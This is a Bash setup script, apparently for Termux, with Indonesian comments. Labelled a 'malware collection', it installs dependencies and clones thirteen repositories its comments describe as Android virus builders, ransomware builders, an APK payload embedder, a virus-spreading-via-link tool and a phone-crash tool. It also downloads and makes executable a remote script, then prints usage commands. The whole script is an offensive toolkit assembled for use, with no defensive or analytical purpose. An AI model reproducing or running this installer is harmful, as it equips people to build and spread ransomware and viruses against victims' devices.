#!/bin/bash
# LEONORE MALWARE COLLECTION - Setup Script
# Jangan lupa: apt update && apt upgrade dulu

echo "[*] Installing dependencies..."
pkg update -y && pkg upgrade -y
pkg install -y python python2 git bash curl wget openssl
pkg install -y openjdk-17 zip apksigner
pip install lolcat requests

mkdir -p ~/leonore-collection
cd ~/leonore-collection

echo "[*] Cloning all tools... (renamed to leonore-*)"

# 1. AVirus - All-in-one virus toolkit
git clone https://github.com/TheCyberBoy/avirus leonore-avirus

# 2. VirusCrafter - Android virus creator
git clone https://github.com/TermuxHackz/VirusCrafter leonore-viruscrafter

# 3. Infect - Spread Android virus via link
git clone https://github.com/noob-hackers/Infect leonore-infect

# 4. Ransomware collection (Err0r-ICA)
git clone https://github.com/Err0r-ICA/Ransomware leonore-ransomware

# 5. TigerVirus - Virus builder Termux
git clone https://github.com/Devil-Tigers/TigerVirus leonore-tigervirus

# 6. Toxin - Embed payload in APK
curl -s https://raw.githubusercontent.com/ksauraj/toxin/master/toxin -o leonore-toxin.sh
chmod +x leonore-toxin.sh

# 7. Exploit - Android Ransomware builder
git clone https://github.com/popeye0013/Exploit leonore-exploit

# 8. Payload Virus - Collection payloads
git clone https://github.com/TermuxHackz/payload-virus leonore-payload

# 9. SARA - Simple Android Ransomware Attack
git clone https://github.com/termuxhackers-id/SARA leonore-sara

# 10. GenVirus - Generate Android virus APK
git clone https://github.com/sowmiksudo/GenVirus leonore-genvirus

# 11. TermuxPayload - Prank payload collection
git clone https://github.com/iamunixtz/TermuxPayload leonore-termuxpayload

# 12. HXP-Ducky - Crash android via link
git clone https://github.com/hackerxphantom/HXP-Ducky leonore-hxpducky

# 13. VirusX - Old school virus creator
git clone https://github.com/TSMaitry/VirusX leonore-virusx

echo ""
echo "[✓] LEONORE COLLECTION SELESAI DI-CLONE!"
echo "[✓] Total: 13 tools di ~/leonore-collection/"
echo ""
echo "Cara pake:"
echo "  cd ~/leonore-collection/leonore-avirus && bash avirus"
echo "  cd ~/leonore-collection/leonore-viruscrafter && python2 VirusCrafter.py"
echo "  cd ~/leonore-collection/leonore-infect && bash infect.sh"
echo ""
